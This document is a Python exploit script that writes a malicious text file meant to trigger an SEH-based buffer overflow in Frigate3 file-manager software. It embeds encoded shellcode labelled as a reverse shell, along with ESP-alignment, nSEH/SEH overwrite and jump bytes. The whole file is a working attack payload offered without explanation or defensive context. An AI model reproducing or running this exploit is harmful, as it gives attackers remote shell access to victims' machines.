#!/usr/bin/python

import struct

filename = 'test.txt'

revshell =  b""
revshell += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
revshell += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
revshell += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
revshell += b"\x42\x75\x4a\x49\x49\x6c\x4a\x48\x4f\x72\x73\x30"
revshell += b"\x35\x50\x75\x50\x75\x30\x6d\x59\x59\x75\x55\x61"
revshell += b"\x4b\x70\x50\x64\x4c\x4b\x72\x70\x44\x70\x6c\x4b"
revshell += b"\x43\x62\x64\x4c\x6c\x4b\x42\x72\x45\x44\x6e\x6b"
revshell += b"\x44\x32\x56\x48\x74\x4f\x4e\x57\x50\x4a\x57\x56"
revshell += b"\x34\x71\x59\x6f\x6e\x4c\x55\x6c\x45\x31\x51\x6c"
revshell += b"\x34\x42\x56\x4c\x45\x70\x6f\x31\x38\x4f\x54\x4d"
revshell += b"\x67\x71\x5a\x67\x4d\x32\x4c\x32\x43\x62\x63\x67"
revshell += b"\x4c\x4b\x76\x32\x72\x30\x4e\x6b\x50\x4a\x47\x4c"
revshell += b"\x4e\x6b\x62\x6c\x67\x61\x71\x68\x78\x63\x52\x68"
revshell += b"\x33\x31\x68\x51\x30\x51\x6e\x6b\x72\x79\x51\x30"
revshell += b"\x73\x31\x4e\x33\x6c\x4b\x32\x69\x35\x48\x4b\x53"
revshell += b"\x77\x4a\x63\x79\x6c\x4b\x70\x34\x6c\x4b\x36\x61"
revshell += b"\x59\x46\x66\x51\x6b\x4f\x6e\x4c\x5a\x61\x48\x4f"
revshell += b"\x74\x4d\x66\x61\x6a\x67\x30\x38\x69\x70\x31\x65"
revshell += b"\x68\x76\x47\x73\x43\x4d\x49\x68\x45\x6b\x31\x6d"
revshell += b"\x54\x64\x43\x45\x78\x64\x36\x38\x6c\x4b\x66\x38"
revshell += b"\x44\x64\x65\x51\x38\x53\x30\x66\x6c\x4b\x64\x4c"
revshell += b"\x50\x4b\x4e\x6b\x76\x38\x57\x6c\x73\x31\x6a\x73"
revshell += b"\x6e\x6b\x66\x64\x6e\x6b\x46\x61\x4e\x30\x4d\x59"
revshell += b"\x37\x34\x67\x54\x56\x44\x31\x4b\x63\x6b\x51\x71"
revshell += b"\x73\x69\x43\x6a\x53\x61\x4b\x4f\x59\x70\x31\x4f"
revshell += b"\x43\x6f\x52\x7a\x6e\x6b\x44\x52\x78\x6b\x4e\x6d"
revshell += b"\x31\x4d\x71\x78\x44\x73\x76\x52\x67\x70\x75\x50"
revshell += b"\x55\x38\x71\x67\x71\x63\x56\x52\x73\x6f\x53\x64"
revshell += b"\x32\x48\x62\x6c\x33\x47\x54\x66\x73\x37\x69\x6f"
revshell += b"\x39\x45\x38\x38\x4c\x50\x66\x61\x47\x70\x35\x50"
revshell += b"\x35\x79\x79\x54\x62\x74\x66\x30\x72\x48\x71\x39"
revshell += b"\x6f\x70\x52\x4b\x47\x70\x4b\x4f\x59\x45\x56\x30"
revshell += b"\x72\x70\x72\x70\x36\x30\x53\x70\x62\x70\x57\x30"
revshell += b"\x56\x30\x65\x38\x39\x7a\x64\x4f\x59\x4f\x6d\x30"
revshell += b"\x6b\x4f\x5a\x75\x6a\x37\x52\x4a\x54\x45\x32\x48"
revshell += b"\x79\x50\x6d\x78\x72\x44\x32\x55\x30\x68\x73\x32"
revshell += b"\x45\x50\x52\x31\x73\x6c\x6b\x39\x49\x76\x33\x5a"
revshell += b"\x62\x30\x62\x76\x70\x57\x62\x48\x6e\x79\x6c\x65"
revshell += b"\x44\x34\x31\x71\x49\x6f\x68\x55\x4b\x35\x69\x50"
revshell += b"\x42\x54\x34\x4c\x79\x6f\x32\x6e\x67\x78\x71\x65"
revshell += b"\x5a\x4c\x42\x48\x58\x70\x4d\x65\x6e\x42\x53\x66"
revshell += b"\x6b\x4f\x39\x45\x51\x78\x50\x63\x42\x4d\x65\x34"
revshell += b"\x65\x50\x6c\x49\x5a\x43\x50\x57\x63\x67\x63\x67"
revshell += b"\x75\x61\x39\x66\x70\x6a\x76\x72\x61\x49\x50\x56"
revshell += b"\x7a\x42\x69\x6d\x52\x46\x4f\x37\x42\x64\x77\x54"
revshell += b"\x47\x4c\x35\x51\x63\x31\x6e\x6d\x73\x74\x44\x64"
revshell += b"\x56\x70\x4f\x36\x75\x50\x30\x44\x71\x44\x56\x30"
revshell += b"\x70\x56\x52\x76\x61\x46\x63\x76\x56\x36\x62\x6e"
revshell += b"\x73\x66\x76\x36\x42\x73\x73\x66\x61\x78\x74\x39"
revshell += b"\x78\x4c\x45\x6f\x6e\x66\x79\x6f\x4e\x35\x6d\x59"
revshell += b"\x4d\x30\x50\x4e\x43\x66\x73\x76\x4b\x4f\x34\x70"
revshell += b"\x70\x68\x43\x38\x6c\x47\x57\x6d\x65\x30\x69\x6f"
revshell += b"\x79\x45\x6d\x6b\x5a\x50\x38\x35\x4c\x62\x73\x66"
revshell += b"\x62\x48\x39\x36\x6e\x75\x4d\x6d\x6f\x6d\x49\x6f"
revshell += b"\x68\x55\x77\x4c\x64\x46\x61\x6c\x34\x4a\x4d\x50"
revshell += b"\x79\x6b\x4d\x30\x51\x65\x47\x75\x4f\x4b\x53\x77"
revshell += b"\x55\x43\x50\x72\x70\x6f\x33\x5a\x55\x50\x43\x63"
revshell += b"\x39\x6f\x4e\x35\x41\x41"

alignJumpEsp = "\x54\x58\x66\x05\xE7\x03\x50\x5C\xFF\xE4"

longJump = "\xE9\xE3\xEF\xFF\xFF"

nSeh = "\x74\x06\x75\x04" # NetJumping
Seh = "\x5f\x07\x01\x40"  # 0x4001075f : pop ecx # pop ebp # ret 0x04  - C:\Program Files\Frigate3\rtl60.bpl 

payload  = alignJumpEsp
payload += "A" * 9
payload += revshell
payload += "\x90" * (4112 - 9 - len(alignJumpEsp) - len(revshell) )
payload += nSeh
payload += Seh
payload += longJump
payload += "C" * 11
payload += "A" * 4 # start of Null bytes
payload += "D" * (7000 - len(payload))

print "[+] Creating file %s" % filename
with open(filename, 'w') as f:
    f.write(payload)
print "    File created, wrote %d bytes to file" % len(payload)

